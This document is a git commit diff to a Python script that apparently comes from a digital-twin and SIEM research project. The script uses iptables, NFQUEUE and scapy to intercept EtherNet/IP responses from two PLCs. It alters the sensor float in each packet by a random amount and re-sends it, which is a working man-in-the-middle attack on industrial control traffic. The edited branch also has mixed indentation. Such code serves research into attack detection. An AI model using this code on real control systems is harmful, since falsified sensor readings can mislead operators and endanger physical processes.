1753ac7e72f6e92a61d4e9dd318be1e6f134467a
root <root@seba-VirtualBox>
2021-06-07 21:19:11 +0200

    updates

--- DigitalTwin-SIEM-integration/src/attack_sensor_randomn.py
+++ DigitalTwin-SIEM-integration/src/attack_sensor_randomn.py
@@ -5,6 +5,7 @@ import os
 import binascii
 import struct
 import sys
+import random
 from datetime import datetime as dt
 from scapy.all import *
 
@@ -13,63 +14,55 @@ os.system("modprobe br_netfilter")
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 os.system("iptables -F")
 os.system("iptables -F -t nat")
+#os.system("iptables -A FORWARD -p tcp --dport 44818 -j NFQUEUE --queue-num 1") # Request (Read||Write)
 os.system("iptables -A FORWARD -p tcp --sport 44818 -j NFQUEUE --queue-num 1") # Response
 
 def modify(packet):
     pkt = IP(packet.get_payload())
     
     if (sys.argv[1] == 'PLC3'):
-        print('Hey PLC3')
-        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src == '10.0.0.3':
+        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src =="10.0.0.3":
             if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                 print("Seba")
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
-                newdata = mydata[:-8]+'7f9b223f'
-                print(newdata)
-                pkt[Raw].load = newdata.decode('hex') 
+                payload = mydata[-8:]
+                val = struct.unpack("<f", binascii.unhexlify(payload))[0]
+                scaled = val - random.uniform(0,1) #Random value between 0 and 1 added to sensor measurments
+                newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
+                pkt[Raw].load = newdata.decode('hex')
                 del pkt[IP].chksum
                 del pkt[TCP].chksum
         packet.drop()
         send(pkt)
     elif (sys.argv[1] == 'PLC2'):
-        print('Hey PLC2')
-        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src == '10.0.0.2':
+        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src =="10.0.0.2":
             if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                 print("Seba")
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
-                newdata = mydata[:-8]+'0000c03f'
-                print(newdata)
+                payload = mydata[-8:]
+                val = struct.unpack("<f", binascii.unhexlify(payload))[0]
+                scaled = val - random.uniform(0,1)
+                newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 pkt[Raw].load = newdata.decode('hex')
                 del pkt[IP].chksum
                 del pkt[TCP].chksum
         packet.drop()
         send(pkt)
     elif (sys.argv[1] == 'BOTH'):
-        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818:
-            if pkt[IP].src == '10.0.0.2':
-                print('HEY2')
+        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 :
+            if pkt[IP].src =="10.0.0.2"  or pkt[IP].src =="10.0.0.3":
                 if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
-                    mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
-                    newdata = mydata[:-8]+'0000c03f'
-                    print(newdata)
-                    pkt[Raw].load = newdata.decode('hex')
-                    del pkt[IP].chksum
-                    del pkt[TCP].chksum
-                packet.drop()
-                send(pkt)
-            elif pkt[IP].src == '10.0.0.3':
-                print('HEY3')
-                if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
-                    mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
-                    newdata = mydata[:-8]+'7f9b223f'
-                    print(newdata)
-                    pkt[Raw].load = newdata.decode('hex')
-                    del pkt[IP].chksum
-                    del pkt[TCP].chksum
-                packet.drop()
-                send(pkt)
-    else:
-        print('Invalid option!!')
+                	mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
+                	payload = mydata[-8:]
+                	val = struct.unpack("<f", binascii.unhexlify(payload))[0]
+                        scaled = val - random.uniform(0,1)
+                	newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
+                	pkt[Raw].load = newdata.decode('hex')
+                	del pkt[IP].chksum
+                	del pkt[TCP].chksum
+            packet.drop()
+            send(pkt)
+
 
 nfqueue = NetfilterQueue()
 nfqueue.bind(1, modify)
@@ -78,8 +71,8 @@ try:
     print("START TIME:", str(dt.now()))
     nfqueue.run()
 except KeyboardInterrupt:
-    print("END TIME:", str(dt.now()))
     print("Flushing iptables.")
+    print("END TIME:", str(dt.now()))
     # This flushes everything, you might wanna be careful
     os.system('iptables -F')
     os.system('iptables -X')
